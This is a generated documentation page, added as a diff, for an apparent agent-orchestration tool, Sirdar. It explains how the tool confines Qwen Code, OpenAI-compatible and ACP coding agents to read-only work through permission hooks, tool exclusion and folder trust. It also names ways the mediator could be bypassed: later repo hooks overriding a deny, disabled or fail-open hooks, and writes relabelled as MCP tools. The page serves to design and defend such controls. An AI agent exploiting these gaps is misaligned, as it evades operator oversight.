+<span class="w">  </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">qwen</span><span class="w">                                </span><span class="c1"># optional</span>
+<span class="w">  </span><span class="nt">baseUrl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://dashscope-intl.aliyuncs.com/compatible-mode/v1</span>
+<span class="w">  </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">qwen3-coder-plus</span>
+<span class="w">  </span><span class="nt">apiKey</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keychain:dashscope-api-key</span>
+</code></pre></div>
+<p><code>qwen.apiKey</code> is resolved once, at startup, and held in memory. It reaches the child process as
+<code>OPENAI_API_KEY</code> and nowhere else: it is never written to a run directory and never printed by
+<code>sirdar doctor</code>. Everything Qwen Code reads to choose a backend, a credential, a settings
+location or a system prompt — <code>OPENAI_API_KEY</code>, <code>OPENAI_BASE_URL</code>, <code>OPENAI_MODEL</code>,
+<code>QWEN_API_KEY</code>, <code>QWEN_BASE_URL</code>, <code>QWEN_MODEL</code>, <code>QWEN_CODE_MODEL</code>, <code>QWEN_OAUTH</code>,
+<code>QWEN_DEFAULT_AUTH_TYPE</code>, <code>GEMINI_API_KEY</code>, <code>GEMINI_MODEL</code>, <code>QWEN_HOME</code>, <code>QWEN_DIR</code>,
+<code>QWEN_CODE_SYSTEM_SETTINGS_PATH</code>, <code>QWEN_CODE_SYSTEM_DEFAULTS_PATH</code>,
+<code>QWEN_CODE_TRUSTED_FOLDERS_PATH</code>, <code>QWEN_CODE_MCP_APPROVALS_PATH</code>, <code>QWEN_SYSTEM_MD</code>,
+<code>QWEN_WRITE_SYSTEM_MD</code>, <code>QWEN_SYSTEM_IDENTITY_MD</code>, <code>QWEN_TLS_INSECURE</code>, <code>QWEN_CODE_SAFE_MODE</code> and
+<code>QWEN_CODE_SIMPLE</code> (the last two force <code>disableAllHooks</code>, same as the settings-layer field below)
+— is stripped from the environment the child inherits before the configured values go back in.
+A session's endpoint
+and settings are what the workspace configured, not what happens to be exported in the shell
+that launched Sirdar. Two of those go back in pointing at files Sirdar wrote for the session
+and deletes after it: <code>QWEN_CODE_SYSTEM_SETTINGS_PATH</code>, which carries the permission hook, and
+<code>QWEN_CODE_TRUSTED_FOLDERS_PATH</code>, which carries the folder-trust verdict.</p>
+<p><strong>Permissions.</strong> Qwen Code emits no permission request on its stdout in headless mode. Instead
+Sirdar starts a loopback HTTP listener for the session and registers it as a <code>PreToolUse</code> hook,
+through a private settings file named by <code>QWEN_CODE_SYSTEM_SETTINGS_PATH</code>. Every tool call the
+CLI is about to make is posted to that listener, judged by the same <code>permissions.bash</code> /
+<code>permissions.mcp</code> rules every other provider uses, and answered with an allow or a deny whose
+reason the model sees as the tool result.</p>
+<p><code>QWEN_CODE_SYSTEM_SETTINGS_PATH</code> replaces the <strong>system</strong> settings layer and nothing more:
+your <code>~/.qwen/settings.json</code> and the repository's <code>.qwen/settings.json</code> are still loaded and
+merged on top of it. It is where Sirdar registers its hook, not an isolation boundary. The
+guarantees that have to hold whatever those layers say are on the command line, in the
+folder-trust posture, and in two fields the system layer wins a merge conflict over: the
+session's settings pin <code>disableAllHooks: false</code> and <code>security.allowedHttpHookUrls</code> to exactly
+this session's hook URL, so a workspace or user layer that sets <code>disableAllHooks</code> (directly, or
+through <code>QWEN_CODE_SAFE_MODE</code>/<code>QWEN_CODE_SIMPLE</code> above) or names some other allowed hook URL
+cannot silence or redirect the mediator. Everything below was measured against 0.23.3 and is
+written up in <code>docs/research/09-qwen-wire-formats.md</code>:</p>
+<ul>
+<li><strong>Only read tools are registered.</strong> Every session passes <code>--exclude-tools</code> for every core
+  tool of 0.23.3 except the ones a triage session reads with: <code>read_file</code>, <code>read_many_files</code>,
+  <code>read_mcp_resource</code>, <code>grep_search</code>, <code>search_file_content</code>, <code>glob</code>, <code>list_directory</code>,
+  <code>web_fetch</code>, <code>web_search</code>, <code>todo_write</code> and <code>structured_output</code> — plus the shell, which is
+  conditional (next bullet). The excluded list is therefore <code>agent</code>, <code>artifact</code>,
+  <code>ask_user_question</code>, <code>create_sub_session</code>, <code>cron_create</code>, <code>cron_delete</code>, <code>cron_list</code>,
+  <code>display_image</code>, <code>edit</code>, <code>enter_plan_mode</code>, <code>enter_worktree</code>, <code>exit_plan_mode</code>,
+  <code>exit_worktree</code>, <code>get_goal</code>, <code>image_gen</code>, <code>list_agents</code>, <code>loop_wakeup</code>, <code>lsp</code>, <code>monitor</code>,
+  <code>notebook_edit</code>, <code>propose_goal</code>, <code>record_artifact</code>, <code>record_source</code>, <code>replace</code>,
+  <code>report_findings</code>, <code>request_shutdown</code>, <code>save_memory</code>, <code>send_message</code>, <code>skill</code>, <code>task</code>,
+  <code>task_create</code>, <code>task_list</code>, <code>task_stop</code>, <code>task_update</code>, <code>team_create</code>, <code>team_delete</code>,
+  <code>team_plan_approval</code>, <code>tool_search</code>, <code>update_goal</code>, <code>workflow</code>, <code>write_file</code> and
+  <code>zoom_image</code>. Qwen Code appends that flag to the merged deny list without consulting any
+  settings layer, and a deny beats an allow, so those tools are never registered and the model
+  is never offered them. Against the real binary, a workspace whose <code>.qwen/settings.json</code>
+  allowed <code>run_shell_command</code>, <code>write_file</code>, <code>edit</code>, <code>monitor</code>, <code>agent</code> and <code>skill</code> was offered
+  exactly <code>glob</code>, <code>grep_search</code>, <code>read_file</code>, <code>read_mcp_resource</code>, <code>structured_output</code> and
+  <code>web_fetch</code>.</li>
+<li><strong><code>agent</code>, <code>skill</code> and the task family are excluded for a second reason.</strong> They are how a
+  repository reaches the permission decision itself. A subagent declared in <code>.qwen/agents/*.md</code>
+  and a project skill both carry a <code>hooks:</code> block; Qwen Code registers those under hook source
+  <code>session</code>, which runs <em>after</em> every settings-layer hook, and its <code>PreToolUse</code> merge copies
+  each hook's <code>hookSpecificOutput</code> over the last one — so the final <code>permissionDecision</code> wins
+  and a repo-supplied hook that runs after Sirdar's turns a deny into an allow. Taking away the
+  tools that register one closes that path. They are also no longer mapped onto Claude's <code>Task</code>
+  in the policy, so if a later Qwen registers them anyway they are judged under their own names
+  and refused.</li>
+<li><strong>The workspace runs untrusted.</strong> The session's settings turn
+  <code>security.folderTrust.enabled</code> on (it defaults to <strong>false</strong>, which means every folder is
+  trusted) and <code>QWEN_CODE_TRUSTED_FOLDERS_PATH</code> points at a 0600 file of Sirdar's own naming
+  the workspace <code>DO_NOT_TRUST</code>. The trust verdict is computed from the system and user layers
+  merged with that file — never from the workspace layer — so a repository cannot vote itself
+  trusted, and an entry the operator once added to <code>~/.qwen/trustedFolders.json</code> interactively
+  does not carry into a Sirdar run. With the folder untrusted, Qwen Code substitutes an empty
+  object for the whole workspace settings layer, and skips project agents, project skills'
+  <code>allowedTools</code> and hooks, project <code>QWEN.md</code> context, LSP servers and auto-skill loading.
+  Measured: the same workspace allow-list above put <code>run_shell_command</code> and <code>monitor</code> in front
+  of the model when the folder was trusted, and neither when it was not.</li>
+<li><strong>MCP is the exception that keeps trust.</strong> An untrusted folder makes Qwen Code skip MCP
+  discovery outright, so a session configured to load MCP servers would quietly get none of
+  them. A workspace that named servers — <code>mcp.workspaceOnly</code> with a <code>.mcp.json</code> present, or
+  <code>mcp.workspaceOnly: false</code> — therefore runs trusted, and its <code>.qwen/settings.json</code> layer is
+  live again; the exclusions above still hold, and a hook that layer registers runs <em>before</em>
+  Sirdar's, so it cannot overwrite a decision. The default (<code>mcp.workspaceOnly</code> with no
+  <code>.mcp.json</code>, which loads no servers) runs untrusted. A trusted workspace that actually carries
+  its own <code>.qwen/settings.json</code> or <code>.qwen/agents/</code> gets a <code>system</code> event naming the path rather
+  than a refusal — MCP is exactly the case that has to keep trust to work, so refusing here
+  would take away the one thing trust was kept for.</li>
+<li><strong>A user-level <code>hooks</code> block, or <code>disableAllHooks</code>, refuses the session.</strong> Qwen Code hands
+  its Config the user scope's own hooks when <code>~/.qwen/settings.json</code> has any, and Sirdar's
+  system-layer hook then falls through to the project slot, which an untrusted folder empties —
+  the session would run with no mediator at all. Measured against the real binary: with such a
+  file, no <code>PreToolUse</code> post arrived and the tool call ran unjudged. So Sirdar refuses to start a
+  qwen session while that file registers hooks or sets <code>disableAllHooks: true</code> (belt and braces
+  alongside the system-layer pin above), and says which file and why. The same check refuses
+  outright, naming <code>HOME</code>, when neither <code>HOME</code> nor <code>USERPROFILE</code> is set in the session's
+  environment: Node's own home lookup does not depend on either being set, so a session that had
+  them stripped could still have the child read a real <code>~/.qwen/settings.json</code> this check never
+  saw, and silently treating that as "no user hooks" would be the wrong direction to fail in.</li>
+<li><strong>The hook is authenticated, probed and watched.</strong> Qwen Code fails open — a connection
+  failure, a timeout and a non-2xx are all non-blocking hook failures, and the tool runs. So the
+  hook URL carries a 32-byte random per-session token compared in constant time, and a request
+  without it, without <code>POST</code>, without <code>application/json</code>, or carrying an <code>Origin</code> header (which
+  the CLI's own server-side fetch never sends) is refused with no event recorded and no decision
+  returned. The decision is written and flushed to the child before the permission event is
+  published, so a slow event consumer cannot push a deny past the CLI's 15 s hook timeout and
+  turn it into an allow. Starting a session probes the listener and fails if it cannot be
+  reached; a listener that stops serving mid-run kills the process group and ends the run.</li>
+<li><strong>A tool that runs without a decision ends the session.</strong> Every tool result is matched
+  against the decisions the hook made. The first result for a call the hook never judged kills
+  the process group, writes an <code>error</code> event reading <code>tool ran without a Sirdar decision;
+  session aborted</code>, and fails the run — the CLI's own hook-failure path is fail-open, so a
+  session that has lost its mediator would otherwise carry on with every later call running the
+  same way.</li>
+<li><strong>What is left to the hook.</strong> The read tools above are judged by the same <code>permissions.bash</code>
+  / <code>permissions.mcp</code> rules every other provider uses; <code>read_mcp_resource</code> and every
+  <code>mcp__server__tool</code> go through <code>permissions.mcp</code>. Any name the policy has not been taught —
+  an MCP tool no pattern matches, or a tool a later Qwen adds and this list does not know — is
+  refused with <code>Sirdar policy: not permitted</code>.</li>
+<li><strong><code>web_fetch</code> is judged by <code>permissions.fetch</code>.</strong> It reaches the hook under the name
+  <code>WebFetch</code>, and the destination in its arguments — a <code>url</code>, or a URL written into a <code>prompt</code>
+  — is matched against the workspace's host list before the call is allowed. With no list
+  configured, no fetch is. <code>web_search</code> stays allowed: it names a query and no host (see Web
+  fetch above for what that leaves open).</li>
+</ul>
+<p><strong>The shell.</strong> It is excluded the same way unless the workspace named <code>permissions.bash</code>
+patterns. When it did, <code>--allowed-tools run_shell_command</code> puts it back and the hook is its
+only gate — a Qwen rule written against <code>run_shell_command</code> allows every command whatever
+specifier it carries, so per-command rules cannot be expressed at the CLI level at all.
+<code>monitor</code> stays excluded either way: it takes a command string of its own and would be a
+second, unjudged shell.</p>
+<p><strong>Budgets.</strong> <code>budget.maxTurns</code> becomes <code>--max-session-turns</code> (plus one, because the terminal
+<code>structured_output</code> call spends a turn of its own) and, scaled by four, <code>--max-tool-calls</code>;
+<code>budget.maxMinutes</code> becomes <code>--max-wall-time</code>. A session that named no turn budget still gets
+<code>--max-tool-calls 200</code>. <code>budget.maxUsd</code> never triggers: the CLI reports no cost on the wire, so
+cost is always <code>0</code> and the turn, tool-call and wall-clock budgets are what bound a run.</p>
+<p>Qwen Code's <code>-s/--sandbox</code> is not passed. It wants a container image or a macOS Seatbelt profile
+the operator has set up, a session that cannot start its sandbox fails outright, and it is
+orthogonal to the guarantees above — so it is left to an operator who wants it to configure on
+the binary rather than forced on every run.</p>
+<p><strong>MCP.</strong> Loading MCP servers costs the untrusted-folder posture described above, because Qwen
+Code skips MCP discovery in an untrusted folder. <code>mcp.workspaceOnly</code> is expressed as
+<code>--mcp-config &lt;.mcp.json&gt;</code> plus one
+<code>--allowed-mcp-server-names</code> flag per server that file declares; a workspace with no <code>.mcp.json</code>
+gets a sentinel name no server matches, which loads none. Qwen Code has no
+<code>--strict-mcp-config</code>: <code>--mcp-config</code> merges with your own servers, and the allow-list by name
+is the only thing that narrows the set. That narrowing is <strong>by name only</strong>. If one of your own
+configured servers shares a name with a server the workspace's <code>.mcp.json</code> declares, it passes
+the allow-list, and which of the two definitions the merge keeps is not something Sirdar
+controls. Keep workspace server names distinctive, or keep the operator-level ones out of a
+config a session can see.</p>
+<p><strong>The schema retry costs a process.</strong> Qwen Code refuses <code>--input-format stream-json</code> alongside
+<code>--json-schema</code>, so a session takes exactly one message. When a note fails Sirdar's validation
+the runner resumes the session id in a fresh process (<code>--resume</code>) and puts the correction there,
+which is the path it already had for Codex.</p>
+<p><code>sirdar doctor</code> reports two rows:</p>
+<div class="highlight"><pre><span></span><code>[OK] qwen --version — 0.23.3
+[OK] qwen endpoint — https://dashscope-intl.aliyuncs.com/compatible-mode/v1 (qwen3-coder-plus)
+</code></pre></div>
+<p>Not exercised against a live model: the wire capture was driven by a stub OpenAI-compatible
+server, so the shapes are the CLI's own but no vendor model has run through this adapter yet.</p>
+<h3 id="provider-openai"><code>provider: openai</code><a class="headerlink" href="#provider-openai" title="Permanent link">&para;</a></h3>
+<p><code>claude</code> and <code>codex</code> spawn an agent CLI. <code>openai</code> does not: Sirdar runs the agent loop itself
+against any OpenAI-compatible Chat Completions endpoint — an aggregator (OpenRouter, Groq,
+Together, Fireworks), a vendor (DeepSeek, Zhipu, Moonshot, DashScope, xAI), or a server on your
+own machine (Ollama, vLLM, LM Studio, llama.cpp).</p>
+<div class="highlight"><pre><span></span><code><span class="nt">provider</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">openai</span>
+<span class="nt">openai</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">baseUrl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://openrouter.ai/api/v1</span><span class="w">     </span><span class="c1"># or http://localhost:11434/v1</span>
+<span class="w">  </span><span class="nt">apiKey</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">env:OPENROUTER_API_KEY</span><span class="w">            </span><span class="c1"># omit for a local server that needs none</span>
+<span class="w">  </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">qwen/qwen3-coder</span>
+<span class="w">  </span><span class="nt">maxContextTokens</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">128000</span>
+<span class="w">  </span><span class="nt">price</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">inputPerMTok</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.2</span>
+<span class="w">    </span><span class="nt">outputPerMTok</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.8</span>
+<span class="w">  </span><span class="nt">temperature</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0</span>
+<span class="w">  </span><span class="nt">extraHeaders</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">HTTP-Referer</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://github.com/srivathsanvenkateswaran/Sirdar</span>
+</code></pre></div>
+<p>What the loop gives the model: the read-only tools <code>read_file</code>, <code>list_dir</code>, <code>grep</code>, <code>glob</code>,
+<code>bash</code> (the same <code>permissions.bash</code> allow-list as every other provider) and <code>web_fetch</code> (the
+same <code>permissions.fetch</code> host list, checked by the policy and again inside the tool), plus
+every tool from the MCP servers in the workspace's <code>.mcp.json</code>, named <code>mcp__&lt;server&gt;__&lt;tool&gt;</code> so
+existing <code>mcp__</code> permission rules keep meaning what they meant. There is no write tool to deny:
+read-only is a property of the tool set here, not a policy applied over someone else's tools.</p>
+<p>The note comes back through a <code>submit_note</code> tool whose parameters are the run's note schema, so
+structured output works on endpoints that support no <code>response_format</code> at all. A model that
+answers in prose is reminded once and then the session ends.</p>
+<p>Cost comes from <code>openai.price</code> and the token counts in each response; with no price block, cost
+is reported as <code>0</code> and <code>budget.maxUsd</code> never triggers, leaving <code>budget.maxTurns</code> and
+<code>budget.maxMinutes</code> to bound the run. As the prompt passes 80% of <code>maxContextTokens</code>, the oldest
+tool results are replaced with <code>[trimmed]</code>, keeping the six most recent, so a long investigation
+degrades instead of failing at the endpoint's limit.</p>
+<p><code>openai.apiKey</code> is resolved once, at startup, and held in memory: it is never written to a run
+directory and never printed by <code>sirdar doctor</code>. What the session's own processes get is not
+Sirdar's environment with the credentials taken out, but a small one built from nothing:
+<code>PATH</code>, <code>HOME</code> and <code>LANG</code>, each only when Sirdar itself has it. An allow-listed shell command
+gets exactly those three. An MCP server gets those three plus whatever its own <code>env</code> block in
+<code>.mcp.json</code> asks for.</p>
+<p>That last part is the gap worth knowing. Values in <code>.mcp.json</code> expand <code>${VAR}</code> and <code>$VAR</code> from
+Sirdar's process environment, so a server entry containing
+<code>"env": {"KEY": "${OPENROUTER_API_KEY}"}</code> hands that key to that server, and nothing elsewhere
+in the run undoes it. <code>.mcp.json</code> is the workspace's own file, and reading it is the control;
+no other path in a run passes a credential to a child process.</p>
+<p><code>billing:</code> does not apply: it exists to tell the Claude adapter whether to keep
+<code>ANTHROPIC_API_KEY</code> in place, and this provider is always billed against the key you configure.</p>
+<p><code>sirdar doctor</code> reports two rows for it, from <code>GET {baseUrl}/models</code>:</p>
+<div class="highlight"><pre><span></span><code>[OK] openai endpoint — https://openrouter.ai/api/v1
+[OK] openai model — qwen/qwen3-coder
+</code></pre></div>
+<p>Not in v1: streaming, image content parts, <code>response_format: json_schema</code>, and resuming a
+session in a later process (<code>sirdar resume</code> starts a fresh session instead, because the
+transcript lives in the Sirdar process that ran it).</p>
+<h3 id="provider-acp"><code>provider: acp</code><a class="headerlink" href="#provider-acp" title="Permanent link">&para;</a></h3>
+<p>The Agent Client Protocol is one JSON-RPC dialect that about forty coding agents already speak,
+so one adapter reaches all of them: Gemini CLI, Goose, OpenCode, Qwen Code, Kimi CLI, Crush,
+Junie, Augment, GitHub Copilot CLI, Cursor, Devin, and Claude Code and Codex through the ACP
+adapters. <code>acp.command</code> and <code>acp.args</code> are the agent's launch command;
+<code>docs/research/providers/acp-agents.md</code> lists the ones Sirdar knows about and what each is
+started with.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">provider</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">acp</span>
+<span class="nt">acp</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gemini</span>
+<span class="w">  </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">"--experimental-acp"</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">env</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">{}</span>
+</code></pre></div>
+<p>Sirdar spawns that agent, initializes it, opens a session in the workspace root and hands it the
+stdio MCP servers from the workspace's <code>.mcp.json</code>, in ACP's own <code>mcpServers</code> shape. The agent
+authenticates however its own CLI does, so <code>acp.env</code> is added to its environment rather than
+replacing it, and it holds literal values: anything put there reaches a child process, which is
+what a <code>keychain:</code> reference exists to prevent. Leave credentials in your shell and let the
+agent read them from there.</p>
+<p>What a run gives up by going through ACP, and why:</p>
+<ul>
+<li><strong>No cost signal.</strong> ACP's <code>usage_update</code> carries the agent's context <code>used</code>/<code>size</code> and an
+  optional session cost, and most agents send neither, so <code>budget.maxUsd</code> usually never fires.</li>
+<li><strong>Almost nothing for <code>budget.maxTurns</code> to count.</strong> One ACP turn is a whole prompt turn: the
+  agent may make dozens of model requests and run dozens of tools inside a single
+  <code>session/prompt</code>, and the protocol reports one turn for all of it. An ACP run normally ends
+  at turn one, or two if the note had to be retried, so a turn budget of 20 and a turn budget
+  of 2 stop the same runaway agent — which is to say neither does. <strong><code>budget.maxMinutes</code> is the
+  bound that actually works here.</strong> Set it as if it were the only one.</li>
+<li><strong>No rate-limit signal.</strong> ACP has no equivalent of Claude Code's <code>rate_limit_event</code> or Codex's
+  <code>account/rateLimits/updated</code>, so a spent window arrives as an error and the queue does not
+  pause for it.</li>
+<li><strong>No schema-constrained output.</strong> <code>session/prompt</code> has no schema field, so the note schema goes
+  into the prompt and the agent's own message is parsed as JSON at the end of the turn. A
+  <code>```json</code> fence is unwrapped and a prose preamble tolerated — the last top-level JSON
+  object in the message is taken — but a message with no object in it at all earns the usual one
+  retry turn, sent as a second <code>session/prompt</code>.</li>
+<li><strong>No reason on a denial.</strong> When the agent asks permission, the client may only pick one of the
+  options the agent itself offered — there is no field for a message the model would see. Sirdar
+  picks the <code>reject_once</code> option and records the policy's reason in the event log, and the
+  read-only instruction is already in the prompt so the model is not left guessing.</li>
+</ul>
+<h4 id="what-the-permission-policy-can-and-cannot-reach">What the permission policy can and cannot reach<a class="headerlink" href="#what-the-permission-policy-can-and-cannot-reach" title="Permanent link">&para;</a></h4>
+<p>An ACP agent is a whole CLI, not a tool runner Sirdar drives. It owns its own tools, its own
+configuration and, in most cases, its own globally configured MCP servers, and the protocol
+gives a client no way to see or switch any of that off. Two consequences are worth stating
+plainly, because they are weaker than what the same settings mean for <code>provider: claude</code>:</p>
+<ul>
+<li><strong><code>mcp.workspaceOnly</code> cannot be enforced.</strong> Sirdar passes the workspace's <code>.mcp.json</code> servers
+  in <code>session/new</code>, and the agent adds them to whatever it already has. There is no ACP
+  equivalent of <code>--strict-mcp-config</code>, so if your Gemini CLI or Goose install has global MCP
+  servers configured, the session gets those too. Check the agent's own config if that matters.</li>
+<li><strong>The workspace's <code>.mcp.json</code> <code>env</code> values cross the wire.</strong> They are sent to the agent in
+  <code>session/new</code> so it can start those servers itself, which means any secret expanded into that
+  block ends up in the agent's process, not just Sirdar's.</li>
+</ul>
+<p>Permission checks are advisory in the same way. <code>session/request_permission</code> is sent at the
+agent's discretion — some agents ask before every write, some ask only outside their own
+sandbox, some never ask — so Sirdar's policy governs what it is asked about and nothing else.
+When it is asked, ACP names the <em>kind</em> of the call rather than the agent's own tool name, so
+<code>edit</code>/<code>delete</code>/<code>move</code> are judged as <code>Write</code> and <code>execute</code> as <code>Bash</code> against <code>permissions.bash</code>
+whatever the agent titled them; <code>fetch</code> is judged as <code>WebFetch</code> against <code>permissions.fetch</code>,
+with the URL read out of the request's <code>rawInput</code> and a request Sirdar can find no URL in
+declined; <code>read</code> is judged as <code>Read</code> and <code>search</code> as <code>Grep</code>; an MCP tool names itself in full
+and goes through <code>permissions.mcp</code> unchanged; and a call whose kind the protocol did not state
+is denied, which is the read-only posture applied to the unknown. The five kinds above whose
+meaning the protocol settles — the three writes, <code>execute</code> and <code>fetch</code> — are judged on the kind
+alone, so an agent cannot route a write or a fetch through the laxer MCP rules by titling it
+<code>mcp__editor__apply_diff</code> or <code>mcp__browser__get_page</code>.</p>
+<p>When an <code>edit</code>, <code>delete</code>, <code>move</code>, <code>execute</code> or <code>fetch</code> tool call completes having never produced
+a permission request, the run records an error event naming it. Nothing can be undone at that
+point — the write, or the request, already happened inside the agent's process — but it is the
+difference between finding out and not. An agent that raises that warning is one to run against
+a scratch checkout, or not at all.</p>
+<p>Sirdar declines the write-file and terminal client capabilities at <code>initialize</code>, so a
+well-behaved agent never asks Sirdar to write a file or open a terminal <em>on its behalf</em>; one
+that asks anyway gets a JSON-RPC error and the attempt shows up as a denied permission event.
+That says nothing about what the agent can do with its own tools. It does advertise
+<code>fs/read_text_file</code> and serves it, for files inside the workspace root only — resolved through
+symlinks, so a link inside the workspace pointing out of it is refused — and for at most 8 MiB
+per read.</p>
+<p>Traffic naming a session Sirdar did not open is dropped, and requests naming one are refused.
+Some agents spawn nested subagent sessions of their own; their messages are not this run's
+transcript, and their tool calls are not this run's to approve.</p>
+<p>Resume works where the agent advertises <code>loadSession</code>: the run's handle is the ACP <code>sessionId</code>,
+and a later run reopens it with <code>session/load</code>. An agent without that capability makes
+<code>sirdar resume</code> start a fresh session rather than continue the old one.</p>
+<p><code>sirdar doctor</code> starts the configured agent, initializes it and reports what it said about
+itself — its name and version, the protocol version, and whether it supports <code>loadSession</code> and
+image prompts — then shuts it down again. That is the cheapest way to find out whether an agent
+you have not run before works here at all.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.sections", "content.code.copy", "search.suggest"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
